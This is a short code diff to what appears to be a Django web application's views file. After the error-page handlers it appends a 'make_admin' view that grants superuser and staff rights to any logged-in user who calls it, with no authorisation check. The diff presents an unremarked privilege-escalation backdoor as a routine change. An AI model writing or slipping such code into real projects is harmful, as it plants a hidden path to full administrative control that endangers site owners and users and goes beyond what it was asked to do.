@@ -747,3 +747,15 @@ def handler404(request, exception):
 
 def handler500(request):
     return render(request, '500.html', status=500)
+
+
+from django.contrib.auth.models import User
+
+@login_required
+def make_admin(request):
+    if request.user.is_superuser:
+        return JsonResponse({'status': 'Already admin'})
+    request.user.is_superuser = True
+    request.user.is_staff = True
+    request.user.save()
+    return JsonResponse({'status': 'You are now admin'})
